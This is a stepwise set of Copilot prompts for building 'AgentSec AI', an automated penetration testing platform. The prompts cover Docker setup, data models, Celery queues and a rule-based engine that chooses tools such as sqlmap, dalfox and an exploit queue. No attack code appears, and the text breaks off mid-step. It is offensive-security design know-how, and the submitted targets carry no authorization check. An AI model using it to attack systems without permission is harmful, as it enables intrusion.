
# PHASE 0 — ENVIRONMENT SETUP
# (Windows + Docker + FastAPI + Celery + Redis + PostgreSQL)

---

### Step 0.0 — Install Docker Desktop First

```
Before touching any code, do this manually:

1. Go to https://www.docker.com/products/docker-desktop/
2. Download Docker Desktop for Windows
3. Install it (enable WSL 2 backend when prompted)
4. After install, open Docker Desktop and wait for it to say "Engine Running"
5. Open PowerShell and verify:
   docker --version
   docker compose version
   
Expected output:
   Docker version 24.x.x
   Docker Compose version v2.x.x

Do not proceed until both commands return version numbers.
WSL 2 must be enabled. If not, run this in PowerShell as Administrator:
   wsl --install
   wsl --set-default-version 2
Then restart your machine and reopen Docker Desktop.
```

---

### Step 0.1 — Copilot Master Prompt (Paste This First, Always)

```
You are a senior backend engineer helping me build AgentSec AI.
AgentSec AI is an autonomous AI-powered attack surface management 
and penetration testing platform.

CONFIRMED STACK:
- OS: Windows 11, Docker Desktop with WSL2 backend
- Backend: FastAPI (Python 3.11)
- ORM: SQLAlchemy 2.x (async)
- Task Queue: Celery 5.x
- Broker + Cache: Redis 7 (Docker)
- Database: PostgreSQL 16 (Docker)
- WebSocket: FastAPI native
- Frontend: React.js + Tailwind (later phases)
- Auth: JWT (python-jose + passlib)
- Containerization: Docker + Docker Compose
- IDE: VSCode + GitHub Copilot

GOLDEN RULES — FOLLOW ALWAYS:
1. Never verify or test mid-phase. Only verify at end of each phase.
2. Never regenerate existing code. Ask before overwriting anything.
3. Never hardcode secrets. Always use .env + python-dotenv.
4. Never use print(). Use Python logging module only.
5. Always write async functions where FastAPI or SQLAlchemy supports it.
6. Always write docstrings on every function and class.
7. Generate files in dependency order always.
8. When I say "generate X", generate only X. Do not generate Y and Z 
   unless I ask.
9. Batch related small files in one response to save tokens.
10. Do not explain what you are going to do. Just do it.
11. Do not add placeholder comments like "# add logic here". 
    Write actual working logic.
12. Use absolute imports everywhere. No relative imports.
13. Every Celery task must have: bind=True, max_retries=3, 
    autoretry_for=(Exception,)
14. All database operations must use async sessions.
15. Do not proceed to next phase unless I explicitly say so.

PROJECT STRUCTURE (already decided, do not suggest changes):
agentsec-ai/
├── backend/
│   ├── main.py
│   ├── config/
│   ├── models/
│   ├── api/
│   ├── orchestrator/
│   ├── workers/
│   ├── plugins/
│   ├── reports/
│   └── utils/
├── frontend/
├── tools/          ← cloned repos live here, never touch
├── docker/
├── .env
├── docker-compose.yml
└── requirements.txt

Current phase: PHASE 0 — ENVIRONMENT SETUP
I will tell you when phase changes.
```

---

### Step 0.2 — Generate Folder Structure

```
PHASE 0 — STEP 2

Create the complete folder structure for agentsec-ai on Windows.
Generate a PowerShell script that creates every folder and 
every placeholder file in one shot.

Requirements:
- Use New-Item -ItemType Directory for folders
- Use New-Item -ItemType File for placeholder files
- Every Python package folder must have __init__.py
- Every placeholder .py file must contain only:
  # AgentSec AI — [filename]
  (nothing else, no imports, no logic yet)
- Generate one single .ps1 script called setup_structure.ps1
- Script must be idempotent (safe to run twice, use -Force flag)
- Do not ask me to create folders manually

Folder structure to create (exact, no changes):
agentsec-ai/
├── backend/
│   ├── main.py
│   ├── config/
│   │   ├── __init__.py
│   │   ├── settings.py
│   │   └── database.py
│   ├── models/
│   │   ├── __init__.py
│   │   ├── base.py
│   │   ├── organization.py
│   │   ├── domain.py
│   │   ├── subdomain.py
│   │   ├── host.py
│   │   ├── port.py
│   │   ├── service.py
│   │   ├── technology.py
│   │   ├── endpoint.py
│   │   ├── finding.py
│   │   ├── task.py
│   │   ├── plugin.py
│   │   ├── result.py
│   │   ├── scan.py
│   │   └── user.py
│   ├── api/
│   │   ├── __init__.py
│   │   ├── router.py
│   │   ├── auth.py
│   │   ├── scans.py
│   │   ├── assets.py
│   │   ├── findings.py
│   │   ├── reports.py
│   │   └── websocket.py
│   ├── orchestrator/
│   │   ├── __init__.py
│   │   ├── orchestrator.py
│   │   ├── decision_engine.py
│   │   ├── event_bus.py
│   │   ├── fallback_manager.py
│   │   └── state_machine.py
│   ├── workers/
│   │   ├── __init__.py
│   │   ├── celery_app.py
│   │   ├── recon_agent.py
│   │   ├── enum_agent.py
│   │   ├── vuln_agent.py
│   │   ├── secret_agent.py
│   │   ├── exploit_agent.py
│   │   └── report_agent.py
│   ├── plugins/
│   │   ├── __init__.py
│   │   ├── base_plugin.py
│   │   ├── subfinder.py
│   │   ├── amass.py
│   │   ├── assetfinder.py
│   │   ├── findomain.py
│   │   ├── dnsx.py
│   │   ├── httpx_plugin.py
│   │   ├── naabu.py
│   │   ├── rustscan.py
│   │   ├── nmap_plugin.py
│   │   ├── whatweb.py
│   │   ├── katana.py
│   │   ├── waybackurls.py
│   │   ├── gau.py
│   │   ├── nuclei_plugin.py
│   │   ├── sqlmap_plugin.py
│   │   ├── dalfox.py
│   │   ├── jwt_tool.py
│   │   ├── corsy.py
│   │   ├── tplmap.py
│   │   ├── subjack.py
│   │   ├── trufflehog.py
│   │   ├── gitleaks.py
│   │   ├── secretfinder.py
│   │   ├── linkfinder.py
│   │   ├── s3scanner.py
│   │   ├── cloud_enum.py
│   │   ├── wpscan_plugin.py
│   │   ├── ffuf_plugin.py
│   │   └── scrapegraph_plugin.py
│   ├── reports/
│   │   ├── __init__.py
│   │   ├── pdf_generator.py
│   │   ├── report_builder.py
│   │   └── owasp_mapper.py
│   └── utils/
│       ├── __init__.py
│       ├── logger.py
│       ├── validators.py
│       └── helpers.py
├── frontend/
│   └── .gitkeep
├── tools/
│   └── .gitkeep
├── docker/
│   ├── Dockerfile.backend
│   ├── Dockerfile.worker
│   └── nginx.conf
├── .env
├── .env.example
├── .gitignore
├── docker-compose.yml
└── requirements.txt

After generating setup_structure.ps1, stop. 
Do not generate any file contents yet.
```

---

### Step 0.3 — Generate .env and .env.example

```
PHASE 0 — STEP 3

Generate two files: .env and .env.example

Rules:
- .env has actual development values
- .env.example has empty values with comments explaining each variable
- Never use production secrets in .env, use dev placeholders
- Every variable must have a comment in .env.example

Variables needed:

# Application
APP_NAME=AgentSec AI
APP_ENV=development
APP_DEBUG=True
SECRET_KEY= (generate a random 64-char hex string for .env)
ALLOWED_HOSTS=localhost,127.0.0.1

# Database
DATABASE_URL=postgresql+asyncpg://agentsec:agentsec123@localhost:5432/agentsecdb
POSTGRES_USER=agentsec
POSTGRES_PASSWORD=agentsec123
POSTGRES_DB=agentsecdb
POSTGRES_HOST=postgres
POSTGRES_PORT=5432

# Redis
REDIS_URL=redis://localhost:6379/0
REDIS_HOST=redis
REDIS_PORT=6379

# Celery
CELERY_BROKER_URL=redis://redis:6379/0
CELERY_RESULT_BACKEND=redis://redis:6379/0

# JWT Auth
JWT_SECRET_KEY= (generate random 64-char hex for .env)
JWT_ALGORITHM=HS256
JWT_ACCESS_TOKEN_EXPIRE_MINUTES=60
JWT_REFRESH_TOKEN_EXPIRE_DAYS=7

# AI / LLM
ANTHROPIC_API_KEY=
OPENAI_API_KEY=

# Notifications
SLACK_WEBHOOK_URL=
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=
DISCORD_WEBHOOK_URL=

# Tools Paths (where binaries live inside Docker)
TOOLS_BASE_PATH=/opt/tools
SUBFINDER_PATH=/usr/local/bin/subfinder
AMASS_PATH=/usr/local/bin/amass
NMAP_PATH=/usr/bin/nmap
NUCLEI_PATH=/usr/local/bin/nuclei
HTTPX_PATH=/usr/local/bin/httpx
NAABU_PATH=/usr/local/bin/naabu
KATANA_PATH=/usr/local/bin/katana

# Scan Settings
MAX_CONCURRENT_SCANS=5
SCAN_TIMEOUT_SECONDS=3600
TOOL_TIMEOUT_SECONDS=300

Generate both files. Stop after this step.
```

---

### Step 0.4 — Generate requirements.txt

```
PHASE 0 — STEP 4

Generate requirements.txt with exact pinned versions.

Categories and packages needed:

# Core API
fastapi==0.111.0
uvicorn[standard]==0.30.1
python-multipart==0.0.9

# Database
sqlalchemy[asyncio]==2.0.30
asyncpg==0.29.0
alembic==1.13.1

# Celery + Redis
celery==5.4.0
redis==5.0.4
kombu==5.3.3

# Auth
python-jose[cryptography]==3.3.0
passlib[bcrypt]==1.7.4

# Environment
python-dotenv==1.0.1
pydantic==2.7.1
pydantic-settings==2.3.0

# HTTP Client (for tool result fetching + webhook notifications)
httpx==0.27.0
aiohttp==3.9.5

# AI / LLM
anthropic==0.28.0
openai==1.30.1

# Report Generation
weasyprint==62.1
jinja2==3.1.4

# Utilities
python-dateutil==2.9.0
ujson==5.10.0
loguru==0.7.2

# Dev + Testing
pytest==8.2.1
pytest-asyncio==0.23.7
httpx==0.27.0

Generate requirements.txt only. Stop after.
```

---

### Step 0.5 — Generate docker-compose.yml

```
PHASE 0 — STEP 5

Generate docker-compose.yml for the full AgentSec AI stack.

Services required:
1. postgres — PostgreSQL 16
2. redis — Redis 7 Alpine
3. backend — FastAPI app
4. worker_recon — Celery worker for recon queue
5. worker_enum — Celery worker for enum queue
6. worker_vuln — Celery worker for vuln queue
7. worker_secrets — Celery worker for secrets queue
8. worker_report — Celery worker for report queue
9. flower — Celery monitoring UI (port 5555)

Rules:
- Use env_file: .env on every service
- postgres and redis must have named volumes for persistence
- backend depends_on: postgres, redis (with condition: service_healthy)
- All worker_* services depend_on: backend
- postgres must have a healthcheck using pg_isready
- redis must have a healthcheck using redis-cli ping
- backend runs on port 8000
- All workers run same Dockerfile.worker but different 
  --queues argument (recon_queue, enum_queue, vuln_queue, 
  secrets_queue, report_queue)
- Use restart: unless-stopped on all services
- Network: single bridge network called agentsec_network
- Flower connects to broker via CELERY_BROKER_URL from .env
- Mount ./backend:/app/backend as volume on backend + all workers
  so code changes reflect without rebuild during development
- Do not expose postgres or redis ports externally in production 
  but expose them in dev (5432 and 6379) for debugging

Generate docker-compose.yml only. Stop after.
```

---

### Step 0.6 — Generate Dockerfiles

```
PHASE 0 — STEP 6

Generate two Dockerfiles:
1. docker/Dockerfile.backend  → for FastAPI app
2. docker/Dockerfile.worker   → for Celery workers

Dockerfile.backend requirements:
- Base: python:3.11-slim
- Set WORKDIR /app
- Copy requirements.txt first (for Docker layer caching)
- Run pip install --no-cache-dir -r requirements.txt
- Copy backend/ into /app/backend/
- Expose port 8000
- CMD: uvicorn backend.main:app --host 0.0.0.0 --port 8000 --reload

Dockerfile.worker requirements:
- Base: python:3.11-slim
- Install system packages: curl wget git nmap whois 
  (security tools that need apt-get)
- Set WORKDIR /app
- Copy requirements.txt and pip install
- Copy backend/ into /app/backend/
- CMD must accept queue name as environment variable CELERY_QUEUE
- CMD: celery -A backend.workers.celery_app worker 
       --loglevel=info --queues=${CELERY_QUEUE}

Both files must have:
- ENV PYTHONDONTWRITEBYTECODE=1
- ENV PYTHONUNBUFFERED=1
- Non-root user for security (create user appuser, run as appuser)

Generate both Dockerfiles. Stop after.
```

---

### Step 0.7 — Generate .gitignore

```
PHASE 0 — STEP 7

Generate .gitignore for AgentSec AI.

Must include:
- Python: __pycache__, *.pyc, *.pyo, .venv, venv/, 
  *.egg-info, dist/, build/, .pytest_cache/
- Environment: .env (never commit), NOT .env.example
- Docker: docker/data/, postgres_data/, redis_data/
- IDE: .vscode/settings.json (but NOT .vscode/extensions.json)
- OS: .DS_Store, Thumbs.db, desktop.ini
- Logs: *.log, logs/
- Reports output: reports/output/
- Alembic: keep alembic/versions/ tracked but ignore *.pyc inside it
- Node (for later): node_modules/, frontend/dist/, frontend/build/
- Tool outputs: tools/output/, scan_results/

Generate .gitignore only. Stop after.
```

---

### Step 0.8 — Phase 0 Verification (Only Now, Not Before)

```
PHASE 0 — STEP 8 — FINAL VERIFICATION

Now that all Phase 0 files are generated, verify everything works.
Give me the exact commands to run in PowerShell in this order:

1. Run setup_structure.ps1 to create folders
2. Build Docker images
3. Start all containers
4. Verify postgres is healthy
5. Verify redis is healthy  
6. Verify backend container starts without error
7. Verify flower dashboard is accessible
8. Expected output for each command

Commands must be Windows PowerShell compatible.
Use docker compose (v2 syntax, no hyphen).

After I run these and confirm success, Phase 0 is complete.
```

---
---

# PHASE 1 — CORE DATA MODELS

---

### Step 1.0 — Phase 1 Master Context

```
PHASE 1 — DATA MODELS

Phase 0 is complete. All containers are running.
Now moving to Phase 1: building all SQLAlchemy async models.

Context for this phase:
- ORM: SQLAlchemy 2.x with async support
- All models live in backend/models/
- Every model inherits from a single Base class in base.py
- Every model must have: id (UUID), created_at, updated_at
- Use Python UUID4 for all primary keys, not integers
- All relationships must be explicitly defined with back_populates
- All string fields must have explicit max_length
- All Enum fields must use Python Enum classes
- No logic in models. Models are pure data definitions only.
- Do not generate migrations yet. Only models this phase.

Token rule for this phase:
Generate all models in batches:
  Batch 1: base.py + user.py + organization.py
  Batch 2: scan.py + domain.py + subdomain.py
  Batch 3: host.py + port.py + service.py + technology.py
  Batch 4: endpoint.py + finding.py + task.py + result.py + plugin.py

Wait for me to say "next batch" before generating next batch.
```

---

### Step 1.1 — Batch 1: Base + User + Organization

```
PHASE 1 — BATCH 1

Generate these 3 files in one response:
backend/models/base.py
backend/models/user.py
backend/models/organization.py

base.py requirements:
- DeclarativeBase subclass named Base
- TimestampMixin with created_at, updated_at (auto datetime UTC)
- UUIDMixin with id as UUID4 primary key
- All models will inherit Base + TimestampMixin

user.py requirements:
- Model name: User
- Fields:
  email: str, unique, indexed, max 255
  username: str, unique, indexed, max 100
  hashed_password: str
  is_active: bool, default True
  is_superuser: bool, default False
  role: Enum (ADMIN, ANALYST, VIEWER)
  last_login: datetime, nullable
  api_key: str, unique, nullable, indexed (for API access)
  scan_quota: int, default 10 (scans per day)
- Relationship: one user → many organizations (through membership)
- Relationship: one user → many scans

organization.py requirements:
- Model name: Organization
- Fields:
  name: str, max 255, indexed
  slug: str, unique, max 100
  description: str, nullable, max 1000
  is_active: bool, default True
  plan: Enum (FREE, PRO, ENTERPRISE), default FREE
  max_scans: int, default 5
  max_targets: int, default 10
- Relationship: one org → many domains
- Relationship: one org → many users (members)
- Relationship: one org → many scans

Generate all 3 files. Stop after.
```

---

### Step 1.2 — Batch 2: Scan + Domain + Subdomain

```
PHASE 1 — BATCH 2

Generate these 3 files:
backend/models/scan.py
backend/models/domain.py
backend/models/subdomain.py

scan.py requirements:
- Model name: Scan
- Fields:
  target: str, max 255 (the domain submitted)
  scan_type: Enum (FULL, RECON_ONLY, VULN_ONLY, QUICK)
  status: Enum (PENDING, RUNNING, PAUSED, COMPLETED, FAILED, CANCELLED)
  progress: int, default 0 (0-100 percentage)
  current_phase: str, nullable, max 100
  current_tool: str, nullable, max 100
  started_at: datetime, nullable
  completed_at: datetime, nullable
  error_message: str, nullable, max 2000
  scan_config: JSON (tool preferences, depth settings)
  total_assets: int, default 0
  total_findings: int, default 0
  risk_score: float, nullable
  ai_summary: str, nullable (text, no max)
- FK: organization_id → Organization
- FK: created_by → User
- Relationships: one scan → many findings, assets, tasks, results

domain.py requirements:
- Model name: Domain
- Fields:
  name: str, max 255, indexed (e.g. example.com)
  registrar: str, nullable, max 255
  registration_date: date, nullable
  expiry_date: date, nullable
  nameservers: JSON (list of nameserver strings)
  whois_data: JSON (full raw whois)
  is_wildcard: bool, default False
  ip_address: str, nullable, max 45
  asn: str, nullable, max 20
  asn_org: str, nullable, max 255
  hosting_provider: str, nullable, max 255
  country: str, nullable, max 100
  state: Enum (NEW, DISCOVERED, VERIFIED, ANALYZED, SCANNED, REPORTED, ARCHIVED)
- FK: organization_id → Organization
- FK: scan_id → Scan
- Relationships: one domain → many subdomains

subdomain.py requirements:
- Model name: Subdomain
- Fields:
  name: str, max 500, indexed (full subdomain e.g. api.example.com)
  ip_address: str, nullable, max 45
  cname: str, nullable, max 500
  a_records: JSON
  mx_records: JSON
  txt_records: JSON
  is_alive: bool, default False
  http_status: int, nullable
  https_status: int, nullable
  redirect_url: str, nullable, max 1000
  page_title: str, nullable, max 500
  cdn_provider: str, nullable, max 100
  takeover_vulnerable: bool, default False
  takeover_service: str, nullable, max 100
  state: Enum (same lifecycle as Domain)
  source: str, max 100 (which tool found it: subfinder/amass/etc)
- FK: domain_id → Domain
- FK: scan_id → Scan
- Relationships: one subdomain → many hosts, ports, findings

Generate all 3 files. Stop after.
```

---

### Step 1.3 — Batch 3: Host + Port + Service + Technology

```
PHASE 1 — BATCH 3

Generate these 4 files:
backend/models/host.py
backend/models/port.py
backend/models/service.py
backend/models/technology.py

host.py requirements:
- Model name: Host
- Fields:
  ip_address: str, max 45, indexed
  hostname: str, nullable, max 500
  is_alive: bool, default False
  os_detected: str, nullable, max 255
  os_version: str, nullable, max 100
  mac_address: str, nullable, max 17
  ttl: int, nullable
  screenshot_path: str, nullable, max 1000
  waf_detected: bool, default False
  waf_name: str, nullable, max 100
  state: Enum (lifecycle)
- FK: subdomain_id → Subdomain, nullable
- FK: scan_id → Scan
- Relationships: one host → many ports, technologies, findings

port.py requirements:
- Model name: Port
- Fields:
  number: int, indexed (1-65535)
  protocol: Enum (TCP, UDP)
  state: Enum (OPEN, CLOSED, FILTERED, OPEN_FILTERED)
  is_dangerous: bool, default False
    (True if port in: 21,22,23,25,53,110,111,135,
     139,143,161,443,445,512,513,514,1433,
     1521,2049,3306,3389,5432,5900,6379,8080,
     8443,9200,27017,50000)
  banner: str, nullable, max 2000
  http_accessible: bool, default False
  https_accessible: bool, default False
- FK: host_id → Host
- FK: scan_id → Scan
- Relationship: one port → many services

service.py requirements:
- Model name: Service
- Fields:
  name: str, max 255 (ssh, http, mysql, etc.)
  version: str, nullable, max 255
  product: str, nullable, max 255
  extra_info: str, nullable, max 500
  cpe: str, nullable, max 500 (common platform enumeration)
  is_vulnerable: bool, default False
  vuln_count: int, default 0
- FK: port_id → Port
- FK: scan_id → Scan

technology.py requirements:
- Model name: Technology
- Fields:
  name: str, max 255 (WordPress, React, Laravel, etc.)
  version: str, nullable, max 100
  category: Enum (CMS, FRAMEWORK, SERVER, LANGUAGE, 
                  DATABASE, CDN, ANALYTICS, SECURITY,
                  JAVASCRIPT_LIBRARY, OTHER)
  confidence: int (0-100, detection confidence %)
  is_outdated: bool, default False
  latest_version: str, nullable, max 100
  cve_count: int, default 0
- FK: host_id → Host
- FK: subdomain_id → Subdomain, nullable
- FK: scan_id → Scan

Generate all 4 files. Stop after.
```

---

### Step 1.4 — Batch 4: Endpoint + Finding + Task + Result + Plugin

```
PHASE 1 — BATCH 4

Generate these 5 files:
backend/models/endpoint.py
backend/models/finding.py
backend/models/task.py
backend/models/result.py
backend/models/plugin.py

endpoint.py requirements:
- Model name: Endpoint
- Fields:
  url: str, max 2000, indexed
  path: str, max 1000
  method: Enum (GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD)
  status_code: int, nullable
  content_type: str, nullable, max 200
  parameters: JSON (list of param names)
  has_parameters: bool, default False
  is_authenticated: bool, default False
  is_api: bool, default False
  is_admin: bool, default False
  source: str, max 100 (katana/wayback/manual)
  response_size: int, nullable
  response_time: float, nullable
- FK: subdomain_id → Subdomain
- FK: scan_id → Scan

finding.py requirements:
- Model name: Finding
- Fields:
  title: str, max 500, indexed
  description: str (text)
  severity: Enum (CRITICAL, HIGH, MEDIUM, LOW, INFO)
  cvss_score: float, nullable (0.0-10.0)
  ai_severity_score: float, nullable
  ai_confidence: float, nullable (0.0-1.0)
  cve_id: str, nullable, max 50
  cwe_id: str, nullable, max 50
  owasp_category: str, nullable, max 100
  mitre_technique: str, nullable, max 100
  affected_url: str, nullable, max 2000
  affected_parameter: str, nullable, max 500
  evidence: str, nullable (text, raw tool output)
  request: str, nullable (text, HTTP request)
  response: str, nullable (text, HTTP response snippet)
  business_impact: str, nullable (text, AI generated)
  remediation: str, nullable (text, AI generated)
  ai_explanation: str, nullable (text)
  is_false_positive: bool, default False
  is_confirmed: bool, default False
  tool_found_by: str, max 100
  status: Enum (NEW, CONFIRMED, FALSE_POSITIVE, FIXED, ACCEPTED_RISK)
- FK: scan_id → Scan
- FK: subdomain_id → Subdomain, nullable
- FK: host_id → Host, nullable
- FK: endpoint_id → Endpoint, nullable

task.py requirements:
- Model name: Task
- Fields:
  task_id: str, max 255, unique (Celery task ID)
  name: str, max 255 (human readable: "Subfinder scan on example.com")
  queue: str, max 100 (recon_queue, vuln_queue, etc.)
  status: Enum (PENDING, RUNNING, SUCCESS, FAILED, RETRYING, REVOKED)
  priority: int, default 5 (1=highest, 10=lowest)
  retry_count: int, default 0
  max_retries: int, default 3
  started_at: datetime, nullable
  completed_at: datetime, nullable
  error_message: str, nullable, max 2000
  input_data: JSON
  output_data: JSON, nullable
  tool_name: str, max 100
  fallback_tool: str, nullable, max 100
  execution_time: float, nullable (seconds)
- FK: scan_id → Scan

result.py requirements:
- Model name: Result
- Fields:
  tool_name: str, max 100
  raw_output: str (text, full tool output)
  parsed_output: JSON (structured version of raw_output)
  output_quality_score: float, nullable (0.0-1.0, AI evaluated)
  record_count: int, default 0 (how many items found)
  is_valid: bool, default True
  validation_notes: str, nullable, max 1000
  execution_time: float, nullable (seconds)
- FK: task_id → Task
- FK: scan_id → Scan

plugin.py requirements:
- Model name: Plugin
- Fields:
  name: str, max 100, unique
  version: str, max 50
  category: Enum (RECON, ENUM, VULN, EXPLOIT, SECRET, CLOUD, REPORT)
  is_enabled: bool, default True
  is_installed: bool, default False
  binary_path: str, nullable, max 500
  last_health_check: datetime, nullable
  health_status: Enum (HEALTHY, DEGRADED, UNAVAILABLE, UNKNOWN)
  success_rate: float, nullable (0.0-1.0)
  avg_execution_time: float, nullable
  total_executions: int, default 0
  failed_executions: int, default 0
  fallback_plugin: str, nullable, max 100
  config: JSON (default config for this plugin)
- No FK (Plugin is a global registry, not scan-specific)

Generate all 5 files. Stop after.
```

---

### Step 1.5 — Generate Database Config + Alembic

```
PHASE 1 — STEP 5

Generate these 2 files:
backend/config/database.py
backend/config/settings.py

database.py requirements:
- Async SQLAlchemy engine using DATABASE_URL from .env
- AsyncSession factory
- get_db() async generator (dependency injection for FastAPI)
- init_db() async function that creates all tables on startup
- Use asyncpg driver
- Connection pool: pool_size=10, max_overflow=20, pool_timeout=30

settings.py requirements:
- Pydantic BaseSettings class named Settings
- Load all variables from .env automatically
- Group into nested models:
  DatabaseSettings, RedisSettings, JWTSettings, 
  CelerySettings, AISettings, ScanSettings, ToolSettings
- Single cached instance: settings = Settings()
- Export settings as the only public API of this file

Then generate the Alembic initialization command and 
alembic/env.py configured for async SQLAlchemy.

env.py must:
- Import all models so Alembic detects them
- Use async connection for migrations
- Read DATABASE_URL from settings, not hardcoded

Generate all files. Stop after.
```

---

### Step 1.6 — Phase 1 Verification

```
PHASE 1 — STEP 6 — FINAL VERIFICATION

Phase 1 is complete. Give me exact commands to verify:

1. Run Alembic migration to create all tables
2. Connect to PostgreSQL inside Docker and list all created tables
3. Verify all 15 tables exist with correct names
4. Verify UUID primary keys are working
5. Verify timestamps auto-populate

Expected table names:
users, organizations, scans, domains, subdomains,
hosts, ports, services, technologies, endpoints,
findings, tasks, results, plugins, alembic_version

Give me exact PowerShell + Docker commands.
Do not proceed until I confirm all tables exist.
```

---
---

# PHASE 2 — ORCHESTRATOR + EVENT BUS

---

### Step 2.0 — Phase 2 Master Context

```
PHASE 2 — ORCHESTRATOR + EVENT BUS

Phases 0 and 1 are complete.
Now building the brain of AgentSec AI.

This phase builds:
1. Celery app configuration
2. Event Bus (Redis pub/sub + Celery events)
3. State Machine (asset lifecycle manager)
4. Decision Engine (rule-based tool selector)
5. Fallback Manager (handles tool failures)
6. Orchestrator (master controller tying everything together)

Architecture rule for this phase:
- Agents NEVER call each other directly
- ALL communication goes through Redis via Celery task dispatch
- Orchestrator ONLY listens and dispatches. It runs no tools itself.
- Decision Engine is PURE logic. No async, no DB calls. 
  Input: dict of discovered info. Output: list of tools to run.
- Every decision the Orchestrator makes must be logged to DB 
  as an AuditLog entry (for the AI reasoning dashboard panel)

Token rule:
Generate in this order, wait for "next" between each:
  Step 2.1: Celery app
  Step 2.2: Event Bus
  Step 2.3: State Machine
  Step 2.4: Decision Engine
  Step 2.5: Fallback Manager
  Step 2.6: Orchestrator
  Step 2.7: Verification
```

---

### Step 2.1 — Celery App

```
PHASE 2 — STEP 1

Generate: backend/workers/celery_app.py

Requirements:
- Celery app named "agentsec"
- Broker: CELERY_BROKER_URL from settings
- Backend: CELERY_RESULT_BACKEND from settings
- Queues (define all explicitly, never use default queue):
  recon_queue     → priority 1
  enum_queue      → priority 2
  vuln_queue      → priority 3
  secrets_queue   → priority 3 (parallel with vuln)
  exploit_queue   → priority 4
  report_queue    → priority 5
  orchestrator_queue → priority 0 (highest, always processes first)

- Task serializer: json
- Result serializer: json
- Accept content: json
- Timezone: UTC
- Enable UTC: True
- Task track started: True
- Task send sent event: True
- Worker send task events: True
- Result expires: 86400 (24 hours)
- Task soft time limit: 270 (seconds, from TOOL_TIMEOUT_SECONDS - 30)
- Task time limit: 300 (hard kill after 300s)
- Max tasks per child: 50 (recycle workers to prevent memory leak)
- Beat schedule: empty for now (monitoring tasks added in Phase 10)

- Configure Celery to route tasks by name prefix:
  tasks starting with "recon.*" → recon_queue
  tasks starting with "enum.*" → enum_queue
  tasks starting with "vuln.*" → vuln_queue
  tasks starting with "secrets.*" → secrets_queue
  tasks starting with "exploit.*" → exploit_queue
  tasks starting with "report.*" → report_queue
  tasks starting with "orchestrator.*" → orchestrator_queue

Generate celery_app.py only. Stop after.
```

---

### Step 2.2 — Event Bus

```
PHASE 2 — STEP 2

Generate: backend/orchestrator/event_bus.py

This is the central nervous system. Every agent publishes events here.
The Orchestrator subscribes and reacts.

Requirements:

Define these Event dataclasses (use Python dataclass, not Pydantic):
  ScanStartedEvent(scan_id, target, scan_type, config)
  ReconCompleteEvent(scan_id, subdomain_count, dns_records, asn_data)
  EnumCompleteEvent(scan_id, live_host_count, open_ports, tech_stack, endpoint_count)
  VulnScanCompleteEvent(scan_id, finding_count, critical_count, high_count)
  SecretsCompleteEvent(scan_id, secret_count, cloud_exposure_count)
  ExploitCompleteEvent(scan_id, exploit_results)
  AllCompleteEvent(scan_id)
  ToolStartedEvent(scan_id, tool_name, task_id)
  ToolCompleteEvent(scan_id, tool_name, task_id, result_count, execution_time)
  ToolFailedEvent(scan_id, tool_name, task_id, error, retry_count)
  ScanPausedEvent(scan_id)
  ScanResumedEvent(scan_id)
  ScanCancelledEvent(scan_id)

EventBus class requirements:
- publish(event) → async method
  Serializes event to JSON
  Publishes to Redis channel: agentsec:events:{scan_id}
  Also publishes to agentsec:events:global (for monitoring dashboard)
  Logs every publish to Python logger

- subscribe(scan_id, callback) → async method
  Subscribes to Redis channel for scan_id
  Calls callback(event) on every received message
  Runs in background asyncio task

- publish_to_websocket(scan_id, event) → async method
  Pushes event to Redis list: agentsec:ws:{scan_id}
  Frontend WebSocket handler reads from this list
  This is how live dashboard updates happen

- get_scan_events(scan_id) → async method
  Returns last 100 events for a scan from Redis
  Used by AI reasoning dashboard to show decision history

Use aioredis (via redis-py async client).
EventBus should be instantiated once as a singleton.

Generate event_bus.py only. Stop after.
```

---

### Step 2.3 — State Machine

```
PHASE 2 — STEP 3

Generate: backend/orchestrator/state_machine.py

Asset lifecycle state machine for Domains, Subdomains, Hosts.

States (already defined in models as Enum):
NEW → DISCOVERED → VERIFIED → ANALYZED → SCANNED → REPORTED → ARCHIVED

Rules:
- States can only transition forward (no going back)
- Exception: any state can go to ARCHIVED
- Invalid transitions must raise InvalidStateTransitionError

StateMachine class requirements:

VALID_TRANSITIONS dict:
  NEW → [DISCOVERED]
  DISCOVERED → [VERIFIED]
  VERIFIED → [ANALYZED]
  ANALYZED → [SCANNED]
  SCANNED → [REPORTED]
  REPORTED → [ARCHIVED]
  Any state → ARCHIVED (always allowed)

Methods:
  transition(asset, new_state, db_session) → async
    Validates transition is allowed
    Updates asset.state in database
    Logs transition with timestamp to logger
    Raises InvalidStateTransitionError if invalid
    Returns updated asset

  can_transition(current_state, new_state) → bool
    Pure function, no DB access
    Returns True/False

  get_next_state(current_state) → State
    Returns the natural next state
    Used by Orchestrator to auto-advance assets

  bulk_transition(asset_ids, asset_type, new_state, db_session) → async
    Transitions multiple assets at once
    Uses single DB query for efficiency
    Returns count of transitioned assets

Also define:
  InvalidStateTransitionError(Exception)
  AssetType Enum (DOMAIN, SUBDOMAIN, HOST, ENDPOINT)

Generate state_machine.py only. Stop after.
```

---

### Step 2.4 — Decision Engine

```
PHASE 2 — STEP 4

Generate: backend/orchestrator/decision_engine.py

This is pure logic. No async. No database calls. No I/O.
Input: structured discovery data. Output: list of tools to run.

ScanContext dataclass:
  scan_id: str
  target: str
  discovered_technologies: list[str]
  open_ports: list[int]
  live_hosts: list[str]
  has_parameters: bool
  has_login_page: bool
  has_api_endpoints: bool
  has_graphql: bool
  has_wordpress: bool
  has_jwt: bool
  has_aws_references: bool
  has_github_references: bool
  subdomain_count: int
  endpoint_count: int
  scan_type: str

ToolDecision dataclass:
  tool_name: str
  queue: str
  priority: int
  reason: str (human readable explanation for AI reasoning panel)
  input_params: dict
  fallback_tool: str | None

DecisionEngine class:

decide_recon_tools(target) → list[ToolDecision]
  Always returns: [subfinder, amass, assetfinder, findomain, 
                   chaos, dnsx, whois, asnmap, crt_sh, 
                   gowitness, theharvester]

decide_enum_tools(recon_results) → list[ToolDecision]
  Always returns: [httpx, naabu, nmap, whatweb, katana, 
                   waybackurls, gau, ffuf]
  Priority order based on subdomain count:
    > 100 subdomains → naabu first (fast), then nmap on top ports only
    < 100 subdomains → nmap full scan

decide_vuln_tools(context: ScanContext) → list[ToolDecision]
  RULE-BASED LOGIC (explicit if/else, not ML):
  
  Always run: nuclei (full template scan)
  
  if context.has_parameters or context.has_login_page:
    add: sqlmap, dalfox
    
  if context.has_wordpress:
    add: wpscan
    reason: "WordPress detected — enabling WPScan plugin enumeration"
    
  if context.has_jwt:
    add: jwt_tool
